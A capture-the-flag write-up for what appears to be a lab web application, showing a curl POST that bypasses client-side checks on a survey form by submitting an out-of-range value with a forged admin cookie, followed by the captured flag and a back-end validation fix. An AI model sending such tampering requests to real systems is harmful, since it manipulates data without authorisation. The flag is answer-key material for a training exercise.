# Form data manipulation 1

### Breach description

On the survey page, rewrite the survey count with a higher value than 10

```bash
curl 'http://192.168.64.6/?page=survey#' --compressed -X POST -H 'User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:109.0) Gecko/20100101 Firefox/117.0' -H 'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8' -H 'Accept-Language: fr,fr-FR;q=0.8,en-US;q=0.5,en;q=0.3' -H 'Accept-Encoding: gzip, deflate' -H 'Content-Type: application/x-www-form-urlencoded' -H 'Origin: [http://192.168.64.6](http://192.168.64.6/)' -H 'Connection: keep-alive' -H 'Referer: http://192.168.64.6/?page=survey' -H 'Cookie: I_am_admin=68934a3e9455fa72420237eb05902327' -H 'Upgrade-Insecure-Requests: 1' --data-raw 'sujet=2&valeur=42'
```

**The flag is : 03a944b434d5baff05f46c4bede5792551a2595574bcafc9a6e25f67c382ccaa**

### Explanation of the breach

Form checks in front can be bypassed by directly sending a request with a dev tool or a software like postman / insomnia  

### Breach Fix

Check “valeur” in the back-end of the application and reject values not between 1 and 10 included.
